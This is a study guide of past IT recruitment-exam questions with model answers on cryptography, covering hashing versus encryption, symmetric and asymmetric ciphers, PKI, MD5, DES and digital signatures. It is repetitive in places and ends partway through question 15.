<!-- TOC START -->
**Table of Contents** — 14 subtopics · 156 questions

| # | Subtopic | Questions |
|---|---|---|
| 1 | [Cryptography](#cryptography-27) | 27 |
| 2 | [Social Engineering & Cyber Attacks](#social-engineering--cyber-attacks-26) | 26 |
| 3 | [Firewalls & Network Defense](#firewalls--network-defense-16) | 16 |
| 4 | [Authentication & Access Control](#authentication--access-control-15) | 15 |
| 5 | [Web Security Vulnerabilities](#web-security-vulnerabilities-15) | 15 |
| 6 | [Malware & Security Threats](#malware--security-threats-15) | 15 |
| 7 | [Security Protocols (SSL/TLS, HTTPS)](#security-protocols-ssltls-https-11) | 11 |
| 8 | [Cyber Crime & Security](#cyber-crime--security-9) | 9 |
| 9 | [Security Principles (CIA Triad)](#security-principles-cia-triad-7) | 7 |
| 10 | [VPN & Tunneling Protocols (IPsec, SSL VPN)](#vpn--tunneling-protocols-ipsec-ssl-vpn-6) | 6 |
| 11 | [Critical Information Infrastructure (CII) & Cyber Governance](#critical-information-infrastructure-cii--cyber-governance-3) | 3 |
| 12 | [Cryptography & Network Security Scenarios](#cryptography--network-security-scenarios-3) | 3 |
| 13 | [Email & Messaging Security (Spam, Phishing)](#email--messaging-security-spam-phishing-2) | 2 |
| 14 | [Buffer Overflow & Software Vulnerabilities](#buffer-overflow--software-vulnerabilities-1) | 1 |

<!-- TOC END -->

---

## Cryptography (27)

1. Explain the operational difference between Hashing and Encryption. [SO IT 25-07-2026] *[DESCO Assistant Engineer (CSE) 10.09.2022 compact it 701 (ET: BUET)], [BKSP Assistant Programmer 03.12.2022 compact it 730 (ET: N/A)]*


   Answer:

   | Point | Encryption | Hashing |
   |---|---|---|
   | Direction | Two way; the ciphertext can be decrypted back to the plaintext | One way; the digest cannot be turned back into the input |
   | Key | Requires a key, and the same or a paired key is needed to reverse it | Requires no key, although a keyed variant called HMAC exists |
   | Output length | Varies with the input length | Fixed, whatever the input size: 128 bits for MD5, 256 for SHA-256 |
   | Purpose | Confidentiality, that is keeping data secret | Integrity, that is proving data has not changed |
   | Reversibility | Reversible with the correct key | Irreversible by design |
   | Collisions | Not applicable | Two inputs must never produce the same digest; MD5 and SHA-1 are broken because collisions can be produced |
   | Typical use | Protecting data in transit and at rest, TLS, disk encryption, VPN | Password storage, file integrity checks, digital signatures, blockchain |
   | Algorithms | AES, DES, 3DES, RSA, ECC, Blowfish | MD5, SHA-1, SHA-256, SHA-512, bcrypt, Argon2 |
   | Example | The message "HELLO" encrypted with AES becomes ciphertext that AES with the same key restores to "HELLO" | SHA-256 of "HELLO" is a fixed 64 hex character digest from which "HELLO" can never be recovered |

   Operational difference in one sentence:
   - Encryption is used when the data must be read again later, so it must be reversible; hashing is used when the data must never be read again but must be checked, so it must not be reversible.
   - This is why passwords are hashed and not encrypted: the system never needs to know the password, only to check whether the one just typed produces the same digest. If the database is stolen, hashes with a salt cannot be reversed, whereas encrypted passwords could be if the key were also obtained.
2. Explain the concepts of encryption and decryption with an example. *[Combined Bank Officer (IT) 09.05.2026 debug it (ET: N/A)]*


   Answer:

   - Encryption is the process of converting readable data, called plaintext, into an unreadable form, called ciphertext, using an algorithm and a key, so that anyone intercepting it cannot understand it.
   - Decryption is the reverse process: converting the ciphertext back into the original plaintext using the appropriate key.
   - Together they provide confidentiality, which is the assurance that only the intended recipient can read the message.

   Components:
   - Plaintext: the original readable message.
   - Encryption algorithm, the cipher: the mathematical procedure applied, for example AES or RSA.
   - Key: the secret value that controls the transformation. The algorithm is public; the security rests entirely on the key, which is Kerckhoffs's principle.
   - Ciphertext: the unreadable output.
   - Decryption algorithm: the inverse procedure.

   Simple example, the Caesar cipher with a shift of 3:
   - Plaintext: `HELLO`
   - Each letter is shifted forward by 3 places: H becomes K, E becomes H, L becomes O, L becomes O, O becomes R.
   - Ciphertext: `KHOOR`
   - Decryption shifts each letter back by 3, recovering `HELLO`.
   - Formula: encryption C = (P + K) mod 26, and decryption P = (C − K) mod 26.

   Modern example:
   - When a user opens `https://www.bank.com`, the browser and the server perform a TLS handshake: they authenticate the server through its certificate and agree a symmetric session key using asymmetric cryptography. Everything sent afterwards, including the password and the account details, is encrypted with AES-256 using that session key. An attacker capturing the traffic sees only meaningless bytes.

   Types:
   - Symmetric encryption: one shared key for both operations, fast, used for bulk data. Examples: AES, DES, 3DES.
   - Asymmetric encryption: a public key to encrypt and a private key to decrypt, slow but it solves key distribution. Examples: RSA, ECC.
   - In practice the two are combined: asymmetric cryptography exchanges the key and symmetric cryptography encrypts the data.
3. What is social engineering? What is hashing? How is it different from encryption? *[Combined Bank Officer (IT) 03.01.2026 debug it (ET: N/A)]*


   Answer:

   What social engineering is:
   - Social engineering is the manipulation of people into revealing confidential information or performing an action that compromises security. It attacks the human being rather than the technology, which is why it succeeds against organisations whose technical defences are strong.
   - Techniques: phishing by email, vishing by telephone, smishing by SMS, pretexting, that is inventing a false scenario; baiting with an infected USB drive or a free offer; tailgating, that is following an authorised person through a secure door; quid pro quo, offering help in exchange for credentials; and impersonation of an executive or an IT administrator.
   - Why it works: it exploits trust, authority, fear, urgency, curiosity and the wish to be helpful.
   - Defences: staff awareness training, simulated phishing exercises, verification procedures for any request involving money or credentials, multi-factor authentication, least privilege, and a culture in which reporting a suspected attempt is encouraged rather than punished.

   What hashing is:
   - Hashing is a one way mathematical function that converts an input of any size into a fixed length string called a hash or digest. The same input always produces the same digest, and it is computationally infeasible to recover the input from the digest or to find two inputs with the same digest.
   - Properties required: deterministic, fast to compute, irreversible, collision resistant, and exhibiting the avalanche effect, in which changing one bit of the input changes about half the bits of the output.
   - Algorithms: SHA-256 and SHA-512 are current; MD5 and SHA-1 are broken and must not be used for security. For passwords, deliberately slow algorithms such as bcrypt, scrypt and Argon2 are used with a salt.
   - Uses: password storage, file and message integrity verification, digital signatures, blockchain, and hash tables in programming.

   How hashing differs from encryption:

   | Point | Encryption | Hashing |
   |---|---|---|
   | Direction | Two way; the ciphertext can be decrypted back to the plaintext | One way; the digest cannot be turned back into the input |
   | Key | Requires a key, and the same or a paired key is needed to reverse it | Requires no key, although a keyed variant called HMAC exists |
   | Output length | Varies with the input length | Fixed, whatever the input size: 128 bits for MD5, 256 for SHA-256 |
   | Purpose | Confidentiality, that is keeping data secret | Integrity, that is proving data has not changed |
   | Reversibility | Reversible with the correct key | Irreversible by design |
   | Collisions | Not applicable | Two inputs must never produce the same digest; MD5 and SHA-1 are broken because collisions can be produced |
   | Typical use | Protecting data in transit and at rest, TLS, disk encryption, VPN | Password storage, file integrity checks, digital signatures, blockchain |
   | Algorithms | AES, DES, 3DES, RSA, ECC, Blowfish | MD5, SHA-1, SHA-256, SHA-512, bcrypt, Argon2 |
   | Example | The message "HELLO" encrypted with AES becomes ciphertext that AES with the same key restores to "HELLO" | SHA-256 of "HELLO" is a fixed 64 hex character digest from which "HELLO" can never be recovered |

   Operational difference in one sentence:
   - Encryption is used when the data must be read again later, so it must be reversible; hashing is used when the data must never be read again but must be checked, so it must not be reversible.
   - This is why passwords are hashed and not encrypted: the system never needs to know the password, only to check whether the one just typed produces the same digest. If the database is stolen, hashes with a salt cannot be reversed, whereas encrypted passwords could be if the key were also obtained.
4. **What is Encryption? What are the types? Explain the role of Encryption in security.** *[Senior Officer IT (Job ID: 10225) Date: 22-05-2026 (ET: N/A)]*


   Answer:

   What encryption is:

   - Encryption is the process of converting readable data, called plaintext, into an unreadable form, called ciphertext, using an algorithm and a key, so that anyone intercepting it cannot understand it.
   - Decryption is the reverse process: converting the ciphertext back into the original plaintext using the appropriate key.
   - Together they provide confidentiality, which is the assurance that only the intended recipient can read the message.

   Types of encryption:
   - Symmetric encryption: one shared secret key encrypts and decrypts. It is very fast and suitable for bulk data, but the key must somehow be delivered securely to the other party. Algorithms: AES, DES, 3DES, Blowfish, ChaCha20. Two forms: block ciphers, which encrypt fixed size blocks such as AES with its 128 bit block, and stream ciphers, which encrypt bit by bit.
   - Asymmetric encryption, also called public key encryption: a public key encrypts and the matching private key decrypts. It solves key distribution and enables digital signatures, but it is 100 to 1000 times slower. Algorithms: RSA, ECC, Diffie-Hellman, ElGamal.
   - Hybrid encryption: asymmetric cryptography is used to exchange a symmetric session key, and symmetric cryptography is then used for the data. This is what TLS, HTTPS, PGP and VPNs actually do.
   - By what is protected: encryption in transit, such as TLS and IPsec; encryption at rest, such as full disk encryption with BitLocker or LUKS and database column encryption; and end to end encryption, in which only the two endpoints hold the keys, as in Signal and WhatsApp.

   Role of encryption in security:
   - Confidentiality: it is the primary mechanism for keeping data secret from anyone who intercepts it or steals the storage medium. This is its central role.
   - Integrity: authenticated encryption modes such as AES-GCM detect any alteration of the ciphertext, so tampering is discovered rather than accepted.
   - Authentication: encrypting with a private key, that is signing, proves who produced the message, and certificates prove the identity of a server.
   - Non-repudiation: a digital signature means the sender cannot later deny having sent the message.
   - Secure key exchange: Diffie-Hellman allows two parties who have never met to agree a secret key over a public channel.
   - Protection of data at rest: a stolen laptop or a stolen backup tape is worthless if the disk is encrypted, which converts a serious breach into a non-event.
   - Regulatory compliance: PCI DSS, data protection law and the Bangladesh Bank ICT security guidelines all require encryption of sensitive data.
   - Enabling trust in digital services: online banking, e-commerce and digital signatures exist only because encryption makes them safe enough to use.

   Limitations to state: encryption is only as strong as the key management around it. A weak key, a leaked private key, a broken algorithm such as DES or MD5, or an implementation flaw defeats it entirely, and encryption does not protect data while it is being processed in memory or from a user who is authorised but malicious.
5. **Write the differences among encryption, hashing, and digital signatures. Mention their uses in cybersecurity.** *[NPCBL Sub Assistant Engineer: Cyber Security Analyst Date: 11 July 2026 (ET: N/A)]*


   Answer:

   | Point | Encryption | Hashing | Digital signature |
   |---|---|---|---|
   | Purpose | Confidentiality | Integrity | Authentication, integrity and non-repudiation |
   | Direction | Two way, reversible with the key | One way, irreversible | Uses hashing and asymmetric encryption together |
   | Key used | Symmetric shared key, or a public and private pair | No key | The sender's private key to sign, the sender's public key to verify |
   | Output | Ciphertext, varying in length with the input | A fixed length digest | A signature attached to the message |
   | What it proves | Nothing about the sender by itself | That the data has not changed | Who sent it, that it has not changed, and that the sender cannot deny it |
   | Algorithms | AES, DES, 3DES, RSA, ECC | MD5, SHA-1, SHA-256, SHA-512, bcrypt, Argon2 | RSA, DSA, ECDSA, with SHA-256 as the hash |
   | Reversible | Yes, with the correct key | No | Not applicable; it is verified, not reversed |

   How a digital signature actually works, since it combines the other two:
   - The sender computes a hash of the message, then encrypts that hash with the sender's private key. The result is the signature, which travels with the message.
   - The receiver decrypts the signature with the sender's public key to recover the hash, computes the hash of the received message independently, and compares them. If they match, the sender's identity and the message's integrity are both confirmed.

   Uses in cyber security:
   - Encryption: TLS and HTTPS for web traffic, VPN tunnels with IPsec, full disk encryption on laptops, database and backup encryption, and end to end encrypted messaging. Its role is to keep data secret in transit and at rest.
   - Hashing: storing passwords, so that a stolen database yields no passwords; verifying that a downloaded file or a firmware image has not been tampered with; detecting changes to system files in intrusion detection; building the chain in blockchain; and forming the digest that a digital signature signs.
   - Digital signature: signing software and drivers so that the operating system will trust them; TLS certificates that authenticate a website; signed email with S/MIME or PGP; legally valid electronic documents and e-tendering; signing transactions in blockchain; and code signing in a software supply chain.

   - The three are complementary rather than alternatives: encryption hides the content, hashing proves it is unchanged, and a digital signature proves who produced it.
6. **How many bits MD5 encryption?** *[BARI Assistant Maintenance Engineer 15.11.2025 compact it 1451 (ET: N/A)]*


   Answer: MD5 produces a 128 bit hash value.

   - It is expressed as 32 hexadecimal characters, since each hex character represents 4 bits.
   - MD5 stands for Message Digest algorithm 5, designed by Ronald Rivest in 1991. It processes the input in 512 bit blocks through four rounds.
   - MD5 is a hash function, not an encryption algorithm, so it is one way and cannot be decrypted. The question's use of the word encryption is loose.
   - It is cryptographically broken and must not be used for security. Collisions can be produced in seconds on ordinary hardware, so two different files can be made to share a digest. It survives only for non-security purposes such as detecting accidental file corruption or as a checksum.
   - Current alternatives: SHA-256 with a 256 bit digest and SHA-512 with 512 bits for general use, and bcrypt, scrypt or Argon2 for passwords, since those are deliberately slow.
7. **What type of key used for decrypt message of PKI?** *[BARI Assistant Maintenance Engineer 10.05.2024 compact it 1462 (ET: N/A)]*


   Answer: In a Public Key Infrastructure, the private key is used to decrypt the message.

   - The sender encrypts with the recipient's public key, which is published and available to everyone. Only the matching private key, held secretly by the recipient, can decrypt it.
   - This is what makes confidentiality possible without any prior shared secret: anyone can send a secret to the owner of the key pair, and only the owner can read it.
   - The reverse direction is used for signing: the sender encrypts a hash with the sender's own private key, and anyone can verify it with the sender's public key, which proves authenticity and non-repudiation.
   - A PKI adds the trust framework around this: a Certifying Authority issues a digital certificate binding a public key to a verified identity, a Registration Authority verifies applicants, and a Certificate Revocation List or OCSP publishes certificates that have been withdrawn. Without a PKI, an attacker could publish a false public key in someone else's name.
8. **6.2 Explain the operational difference between Hashing and Encryption.** *[Bangladesh Bank Senior Officer (IT), Grade-9 (Job ID-25104) 2024 (ET: N/A)]*


   Answer:

   | Point | Encryption | Hashing |
   |---|---|---|
   | Direction | Two way; the ciphertext can be decrypted back to the plaintext | One way; the digest cannot be turned back into the input |
   | Key | Requires a key, and the same or a paired key is needed to reverse it | Requires no key, although a keyed variant called HMAC exists |
   | Output length | Varies with the input length | Fixed, whatever the input size: 128 bits for MD5, 256 for SHA-256 |
   | Purpose | Confidentiality, that is keeping data secret | Integrity, that is proving data has not changed |
   | Reversibility | Reversible with the correct key | Irreversible by design |
   | Collisions | Not applicable | Two inputs must never produce the same digest; MD5 and SHA-1 are broken because collisions can be produced |
   | Typical use | Protecting data in transit and at rest, TLS, disk encryption, VPN | Password storage, file integrity checks, digital signatures, blockchain |
   | Algorithms | AES, DES, 3DES, RSA, ECC, Blowfish | MD5, SHA-1, SHA-256, SHA-512, bcrypt, Argon2 |
   | Example | The message "HELLO" encrypted with AES becomes ciphertext that AES with the same key restores to "HELLO" | SHA-256 of "HELLO" is a fixed 64 hex character digest from which "HELLO" can never be recovered |

   Operational difference in one sentence:
   - Encryption is used when the data must be read again later, so it must be reversible; hashing is used when the data must never be read again but must be checked, so it must not be reversible.
   - This is why passwords are hashed and not encrypted: the system never needs to know the password, only to check whether the one just typed produces the same digest. If the database is stolen, hashes with a salt cannot be reversed, whereas encrypted passwords could be if the key were also obtained.
9. **Breifly Explain Asymmetric encryption.** *[WZPGCL Assistant Engineer (CSE) 27.05.2023 compact it 501 (ET: N/A)]*


   Answer: Asymmetric encryption, also called public key cryptography, uses a mathematically related pair of keys instead of a single shared secret: a public key that may be given to anyone, and a private key that the owner alone keeps.

   How it works:
   - Whatever is encrypted with one key of the pair can be decrypted only with the other.
   - For confidentiality: the sender encrypts with the recipient's public key, and only the recipient's private key can decrypt it.
   - For authentication: the sender encrypts a hash with the sender's private key, producing a digital signature, and anyone can verify it with the sender's public key.
   - The private key cannot be derived from the public key in any practical time, because the pair rests on a hard mathematical problem: factoring a very large integer in RSA, or the discrete logarithm on an elliptic curve in ECC.

   Algorithms: RSA, the most widely used, typically with a 2048 or 4096 bit key; ECC, which gives equivalent security with a much shorter key, so a 256 bit ECC key is comparable to a 3072 bit RSA key; Diffie-Hellman for key exchange; and DSA and ECDSA for signatures.

   Advantages:
   - It solves the key distribution problem, since the public key may be published openly and no secret has to be transported.
   - It requires only 2n keys for n users, against n(n − 1)/2 for symmetric cryptography.
   - It provides digital signatures, and therefore authentication and non-repudiation, which symmetric cryptography cannot.

   Disadvantages:
   - It is 100 to 1000 times slower than symmetric encryption, so it is unusable for bulk data.
   - It needs much longer keys for equivalent strength, and it needs a PKI to bind public keys to real identities.
   - It is vulnerable to a man in the middle attack if the public key is not authenticated by a certificate.

   Practical use: it is used in combination with symmetric encryption. In TLS the asymmetric part authenticates the server and agrees a session key, and AES then encrypts the actual traffic. The same hybrid pattern is used in PGP, S/MIME, SSH and VPNs.
10. **Distinguish between Symmetric Encryption and Asymmetric Encryption. Give some examples of encryption algorithm. What are the different types of ciphers in cryptography? What are the factors to be considered for cryptographic strength?** *[Rupali Bank Ltd. Assistant Network Engineer 04.11.2023 compact it 533 (ET: MIST)]*


   Answer:

   Symmetric vs asymmetric encryption:

   | Point | Symmetric encryption | Asymmetric encryption |
   |---|---|---|
   | Keys | One shared secret key for both encryption and decryption | A key pair: a public key to encrypt and a private key to decrypt |
   | Key distribution | The hard problem: the secret key must reach the other party securely | Solved: the public key may be published freely |
   | Speed | Very fast, suitable for bulk data | 100 to 1000 times slower |
   | Key length | 128 or 256 bits | 2048 or 4096 bits for RSA, 256 bits for ECC |
   | Number of keys for n users | n(n − 1)/2 keys | 2n keys, one pair each |
   | Services provided | Confidentiality | Confidentiality, authentication, non-repudiation and key exchange |
   | Algorithms | AES, DES, 3DES, Blowfish, RC4, ChaCha20 | RSA, Diffie-Hellman, ECC, ElGamal, DSA |
   | Typical use | Encrypting files, disks, databases and the bulk of network traffic | Key exchange, digital signatures and certificates |

   How they are used together, which is the point the examiner looks for:
   - Neither is used alone in practice. In TLS, asymmetric cryptography is used at the start of the connection to authenticate the server through its certificate and to agree a session key, and symmetric cryptography, normally AES, is then used for all the actual data, because it is fast enough for a video stream. This is called hybrid encryption, and it takes the key distribution advantage of asymmetric cryptography and the speed advantage of symmetric cryptography.

   Examples of encryption algorithms:
   - Symmetric block ciphers: AES with 128, 192 or 256 bit keys, the current standard; DES with 56 bits, now broken; 3DES; Blowfish and Twofish; IDEA.
   - Symmetric stream ciphers: RC4, now considered insecure, and ChaCha20, which is current.
   - Asymmetric: RSA, ECC, Diffie-Hellman, ElGamal, DSA and ECDSA.
   - Hash functions, which are related but not encryption: SHA-256, SHA-512, and bcrypt and Argon2 for passwords.

   Types of ciphers in cryptography:
   - By era: classical ciphers, that is substitution such as Caesar and Vigenère, and transposition such as rail fence and columnar; and modern ciphers based on mathematics and computation.
   - By key: symmetric, using one shared key, and asymmetric, using a key pair.
   - By unit of operation: block ciphers, which encrypt a fixed size block at a time, such as AES with its 128 bit block, using modes such as ECB, CBC, CTR and GCM; and stream ciphers, which encrypt one bit or byte at a time, such as RC4 and ChaCha20.
   - Substitution cipher: each symbol is replaced by another, either monoalphabetic like Caesar or polyalphabetic like Vigenère.
   - Transposition cipher: the symbols are rearranged rather than replaced.
   - Product cipher: repeated rounds of substitution and transposition combined, which is what every modern block cipher is.

   Factors determining cryptographic strength:
   - Key length: the longer the key the larger the search space. A 128 bit key gives 2¹²⁸ possibilities, which is beyond brute force with any foreseeable technology; a 56 bit DES key is not.
   - Strength of the algorithm itself: it must resist differential and linear cryptanalysis, and it should be public and long scrutinised. A secret algorithm is a warning sign, since security must rest on the key, not on obscurity.
   - Randomness of the key: a key generated from a weak random source is guessable however long it is. This is a very common real world failure.
   - Key management: how keys are generated, distributed, stored, rotated, and destroyed. Most practical breaks are failures of key management rather than of the mathematics.
   - Correct implementation: side channel attacks on timing, power consumption and cache behaviour break otherwise sound algorithms, as do padding oracle flaws.
   - Mode of operation and initialisation vector: ECB mode leaks patterns and must never be used; the IV must be unique and unpredictable.
   - Confusion and diffusion, and the avalanche effect, which Shannon identified as the properties a strong cipher must have.
   - Resistance to known attacks: brute force, dictionary, birthday, replay, chosen plaintext and chosen ciphertext.
   - Salting and iteration count when hashing passwords.
   - Quantum resistance, since Shor's algorithm would break RSA and ECC, which is why post-quantum algorithms are now being standardised.
11. **What is Symmetric and Asymmetric Encryption? Explain with example.** *[NPCBL Executive Trainee (Software) 26.05.2023 compact it 499 (ET: IBA)]*


   Answer:

   Symmetric encryption:
   - One shared secret key is used both to encrypt and to decrypt. Both parties must possess the same key and must keep it secret.
   - It is very fast, so it is used for the bulk of the data.
   - Its weakness is key distribution: the key must somehow reach the other party securely, and for n users n(n − 1)/2 separate keys are needed.
   - Algorithms: AES, DES, 3DES, Blowfish, ChaCha20.

   Example of symmetric encryption:
   - Rahim wants to send a file to Karim. They agree in advance on the key `MYSECRETKEY123`. Rahim encrypts the file with AES using that key and sends it. Karim decrypts it with the same key. Anyone who intercepts the file sees only meaningless bytes, but if the key itself is intercepted while being shared, the whole scheme fails.
   - A simple classroom illustration is the Caesar cipher with key 3: `HELLO` becomes `KHOOR`, and the same key 3 recovers `HELLO`.

   Asymmetric encryption:
   - A mathematically related key pair is used: a public key that may be published, and a private key that the owner alone keeps. What one key encrypts, only the other can decrypt.
   - It solves key distribution and enables digital signatures, but it is 100 to 1000 times slower.
   - Algorithms: RSA, ECC, Diffie-Hellman, ElGamal.

   Example of asymmetric encryption:
   - Karim publishes his public key. Rahim encrypts a message with Karim's public key and sends it. Only Karim's private key can decrypt it, so even Rahim cannot read it once encrypted, and no secret needed to be shared beforehand.
   - If Rahim also signs the message with his own private key, Karim verifies the signature with Rahim's public key and knows the message genuinely came from Rahim.

   Comparison:

   | Point | Symmetric encryption | Asymmetric encryption |
   |---|---|---|
   | Keys | One shared secret key for both encryption and decryption | A key pair: a public key to encrypt and a private key to decrypt |
   | Key distribution | The hard problem: the secret key must reach the other party securely | Solved: the public key may be published freely |
   | Speed | Very fast, suitable for bulk data | 100 to 1000 times slower |
   | Key length | 128 or 256 bits | 2048 or 4096 bits for RSA, 256 bits for ECC |
   | Number of keys for n users | n(n − 1)/2 keys | 2n keys, one pair each |
   | Services provided | Confidentiality | Confidentiality, authentication, non-repudiation and key exchange |
   | Algorithms | AES, DES, 3DES, Blowfish, RC4, ChaCha20 | RSA, Diffie-Hellman, ECC, ElGamal, DSA |
   | Typical use | Encrypting files, disks, databases and the bulk of network traffic | Key exchange, digital signatures and certificates |

   How they are used together, which is the point the examiner looks for:
   - Neither is used alone in practice. In TLS, asymmetric cryptography is used at the start of the connection to authenticate the server through its certificate and to agree a session key, and symmetric cryptography, normally AES, is then used for all the actual data, because it is fast enough for a video stream. This is called hybrid encryption, and it takes the key distribution advantage of asymmetric cryptography and the speed advantage of symmetric cryptography.
12. **What is symmetric and Asymmetric key explain with example?** *[Mongla Port Authority Assistant Programmer 2023 compact it 573 (ET: N/A)]*


   Answer:

   Symmetric key:
   - A single shared secret key used for both encryption and decryption. Both parties hold the same key and must keep it secret.
   - Fast, efficient for large volumes of data, but the key must be distributed securely, and n users need n(n − 1)/2 keys.
   - Algorithms: AES, DES, 3DES, Blowfish, ChaCha20.
   - Example: two branches of a bank share an AES-256 key and use it to encrypt a nightly data file exchanged between them. The same key decrypts it at the other end. The difficulty is how the key was delivered to the second branch in the first place.

   Asymmetric key:
   - A related pair of keys: a public key that may be given to anyone, and a private key kept secret by the owner. What one encrypts, only the other can decrypt.
   - Slower, but it removes the key distribution problem and provides digital signatures, authentication and non-repudiation.
   - Algorithms: RSA, ECC, Diffie-Hellman, ElGamal.
   - Example: a customer's browser obtains a bank's public key from the bank's TLS certificate and uses it to encrypt a session key. Only the bank's private key can recover that session key, so no secret had to be agreed in advance between a customer the bank has never met and the bank.

   Comparison:

   | Point | Symmetric encryption | Asymmetric encryption |
   |---|---|---|
   | Keys | One shared secret key for both encryption and decryption | A key pair: a public key to encrypt and a private key to decrypt |
   | Key distribution | The hard problem: the secret key must reach the other party securely | Solved: the public key may be published freely |
   | Speed | Very fast, suitable for bulk data | 100 to 1000 times slower |
   | Key length | 128 or 256 bits | 2048 or 4096 bits for RSA, 256 bits for ECC |
   | Number of keys for n users | n(n − 1)/2 keys | 2n keys, one pair each |
   | Services provided | Confidentiality | Confidentiality, authentication, non-repudiation and key exchange |
   | Algorithms | AES, DES, 3DES, Blowfish, RC4, ChaCha20 | RSA, Diffie-Hellman, ECC, ElGamal, DSA |
   | Typical use | Encrypting files, disks, databases and the bulk of network traffic | Key exchange, digital signatures and certificates |

   How they are used together, which is the point the examiner looks for:
   - Neither is used alone in practice. In TLS, asymmetric cryptography is used at the start of the connection to authenticate the server through its certificate and to agree a session key, and symmetric cryptography, normally AES, is then used for all the actual data, because it is fast enough for a video stream. This is called hybrid encryption, and it takes the key distribution advantage of asymmetric cryptography and the speed advantage of symmetric cryptography.
13. **What is Cryptography? Difference between Symmetric and Asymmetric encryption with example. Draw and design public key encryption using Hash function. Draw a diagram for e-commerce online transactions.** *[Combined Bank Senior Officer (IT) 13.10.2023 compact it 512 (ET: MIST)]*


   Answer:

   What cryptography is:
   - Cryptography is the science of securing information by transforming it so that only the intended recipient can understand it. It provides confidentiality, integrity, authentication and non-repudiation.
   - Its components are the plaintext, the encryption algorithm, the key, the ciphertext and the decryption algorithm. By Kerckhoffs's principle the algorithm is public and the security rests entirely on the secrecy of the key.
   - Its branches are symmetric cryptography, asymmetric cryptography and hash functions.

   Symmetric vs asymmetric encryption, with examples:

   | Point | Symmetric encryption | Asymmetric encryption |
   |---|---|---|
   | Keys | One shared secret key for both encryption and decryption | A key pair: a public key to encrypt and a private key to decrypt |
   | Key distribution | The hard problem: the secret key must reach the other party securely | Solved: the public key may be published freely |
   | Speed | Very fast, suitable for bulk data | 100 to 1000 times slower |
   | Key length | 128 or 256 bits | 2048 or 4096 bits for RSA, 256 bits for ECC |
   | Number of keys for n users | n(n − 1)/2 keys | 2n keys, one pair each |
   | Services provided | Confidentiality | Confidentiality, authentication, non-repudiation and key exchange |
   | Algorithms | AES, DES, 3DES, Blowfish, RC4, ChaCha20 | RSA, Diffie-Hellman, ECC, ElGamal, DSA |
   | Typical use | Encrypting files, disks, databases and the bulk of network traffic | Key exchange, digital signatures and certificates |

   How they are used together, which is the point the examiner looks for:
   - Neither is used alone in practice. In TLS, asymmetric cryptography is used at the start of the connection to authenticate the server through its certificate and to agree a session key, and symmetric cryptography, normally AES, is then used for all the actual data, because it is fast enough for a video stream. This is called hybrid encryption, and it takes the key distribution advantage of asymmetric cryptography and the speed advantage of symmetric cryptography.

   - Symmetric example: two parties share an AES-256 key and use it to encrypt a data file; the same key decrypts it.
   - Asymmetric example: a browser encrypts a session key with the bank's public key, and only the bank's private key can recover it.

   Public key encryption using a hash function, that is a digital signature:

   ```mermaid
   graph LR
       A["Message"] --> B["Hash function SHA-256"]
       B --> C["Message digest"]
       C --> D["Encrypt with sender's PRIVATE key"]
       D --> E["Digital signature"]
       A --> F["Message + Signature sent"]
       E --> F
       F --> G["Receiver"]
       G --> H["Decrypt signature with sender's PUBLIC key -> digest 1"]
       G --> I["Hash the received message -> digest 2"]
       H --> J{"digest 1 = digest 2 ?"}
       I --> J
       J -->|Yes| K["Authentic and unaltered"]
       J -->|No| L["Reject: forged or tampered"]
   ```

   - The hash is signed rather than the whole message because asymmetric encryption is slow, and a fixed length digest is far cheaper to sign than a large document.
   - If confidentiality is also required, the message itself is separately encrypted with the recipient's public key or with a symmetric session key.

   E-commerce online transaction flow:

   ```mermaid
   graph LR
       A["Customer browser"] -->|"HTTPS, TLS encrypted"| B["Merchant website"]
       B --> C["Payment Gateway: encrypts card data"]
       C --> D["Payment Processor / Switch"]
       D --> E["Acquiring Bank"]
       E --> F["Card Network: Visa or Mastercard"]
       F --> G["Issuing Bank: verifies and authorises"]
       G --> F
       F --> E
       E --> C
       C --> B
       B --> A
       G -.->|"Settlement next day"| E
   ```

   - Security at each stage: TLS protects the browser to merchant link; the gateway tokenises or encrypts the card data so the merchant never stores it; 3-D Secure adds an OTP challenge to the cardholder; and PCI DSS governs how card data is handled throughout.
14. **The high level method of DES...** *[BPDB Assistant Engineer (CSE) 24.02.2023 compact it 450 (ET: BUET)]*


   Answer: DES, the Data Encryption Standard, is a symmetric block cipher published in 1977 and based on the Feistel structure.

   High level method:
   - Block size 64 bits, key size 64 bits of which only 56 are effective, since 8 bits are parity. It performs 16 rounds.
   - Step 1, Initial Permutation: the 64 bit plaintext block is permuted according to a fixed table, and split into a left half L0 and a right half R0 of 32 bits each.
   - Step 2, key schedule: the 56 bit key is permuted and split into two 28 bit halves, which are rotated left by one or two bits at each round and then compressed to produce a different 48 bit subkey for each of the 16 rounds.
   - Step 3, 16 Feistel rounds. In round i:
   - L(i) = R(i−1)
   - R(i) = L(i−1) XOR f(R(i−1), K(i))
   - The function f expands the 32 bit half to 48 bits, XORs it with the 48 bit round subkey, passes the result through eight S-boxes which compress 48 bits back to 32 and provide the non-linearity, and finally applies a permutation.
   - Step 4, after the sixteenth round the two halves are swapped and the Final Permutation, which is the inverse of the initial one, is applied to produce the 64 bit ciphertext.
   - Decryption uses exactly the same algorithm with the subkeys applied in reverse order, which is the great practical advantage of the Feistel structure: one circuit performs both operations.

   Design principles: Shannon's confusion, provided by the S-boxes, and diffusion, provided by the permutations, so that changing one input bit changes about half the output bits, which is the avalanche effect.

   Weakness and status:
   - The 56 bit key is far too short. The whole key space of 2⁵⁶ can be searched in hours with modern hardware, and DES was broken publicly in 1997 and then in under a day in 1998.
   - 3DES applies DES three times with two or three keys, giving an effective 112 bits, but it is slow and is now also deprecated.
   - AES, with 128, 192 or 256 bit keys and a substitution-permutation rather than Feistel structure, replaced DES in 2001 and is the current standard.
15. **Difference between symmetric and asymetric key encryption.** *[BEPZA Programmer 03.11.2023 compact it 562 (ET: N/A)]*


   Answer:

   | Point | Symmetric encryption | Asymmetric encryption |
   |---|---|---|
   | Keys | One shared secret key for both encryption and decryption | A key pair: a public key to encrypt and a private key to decrypt |
   | Key distribution | The hard problem: the secret key must reach the other party securely | Solved: the public key may be published freely |
   | Speed | Very fast, suitable for bulk data | 100 to 1000 times slower |
   | Key length | 128 or 256 bits | 2048 or 4096 bits for RSA, 256 bits for ECC |
   | Number of keys for n users | n(n − 1)/2 keys | 2n keys, one pair each |
   | Services provided | Confidentiality | Confidentiality, authentication, non-repudiation and key exchange |
   | Algorithms | AES, DES, 3DES, Blowfish, RC4, ChaCha20 | RSA, Diffie-Hellman, ECC, ElGamal, DSA |
   | Typical use | Encrypting files, disks, databases and the bulk of network traffic | Key exchange, digital signatures and certificates |

   How they are used together, which is the point the examiner looks for:
